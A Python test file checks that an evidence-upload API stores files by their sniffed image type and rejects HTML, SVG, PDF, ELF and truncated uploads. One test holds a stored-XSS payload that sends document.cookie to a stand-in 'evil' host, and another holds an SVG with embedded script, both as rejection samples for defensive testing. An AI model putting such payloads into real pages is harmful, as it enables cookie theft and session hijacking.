"""Uploaded bytes decide what gets stored -- never the client's filename.

/media is served by StaticFiles, so a stored .html or .svg would execute as
active content on the API origin the moment anyone opened an evidence link.
"""

import pytest

from app.errors import ApiError
from app.routers.evidence import _verify_image


def _png(size: int = 8) -> bytes:
    import cv2
    import numpy as np
    ok, buf = cv2.imencode(".png", np.zeros((size, size, 3), np.uint8))
    assert ok
    return buf.tobytes()


def _jpeg(size: int = 8) -> bytes:
    import cv2
    import numpy as np
    ok, buf = cv2.imencode(".jpg", np.zeros((size, size, 3), np.uint8))
    assert ok
    return buf.tobytes()


def test_png_accepted_with_sniffed_extension():
    ext, mime = _verify_image(_png())
    assert ext == ".png"
    assert mime == "image/png"


def test_jpeg_accepted_with_sniffed_extension():
    ext, mime = _verify_image(_jpeg())
    assert ext == ".jpg"
    assert mime == "image/jpeg"


def test_html_disguised_as_photo_is_rejected():
    """The classic stored-XSS payload."""
    payload = b"<html><script>fetch('https://evil/'+document.cookie)</script></html>"
    with pytest.raises(ApiError) as exc:
        _verify_image(payload)
    assert exc.value.code in {"FILE_NOT_AN_IMAGE", "FILE_TYPE_NOT_ALLOWED"}


def test_svg_is_rejected_even_though_it_is_an_image():
    """SVG is XML that can carry script, and no camera emits it."""
    payload = (
        b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
        b'<script>alert(1)</script></svg>'
    )
    with pytest.raises(ApiError):
        _verify_image(payload)


def test_pdf_is_rejected():
    with pytest.raises(ApiError):
        _verify_image(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")


def test_elf_executable_is_rejected():
    with pytest.raises(ApiError):
        _verify_image(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)


def test_truncated_image_is_rejected_not_stored():
    """A half-uploaded photo must fail loudly, not enter the evidence chain."""
    with pytest.raises(ApiError):
        _verify_image(_png()[:20])


def test_filename_cannot_influence_stored_extension():
    """Whatever the uploader claims, PNG bytes are stored as .png."""
    ext, _ = _verify_image(_png())
    assert ext == ".png"
    assert not ext.endswith((".html", ".svg", ".sh", ".php"))
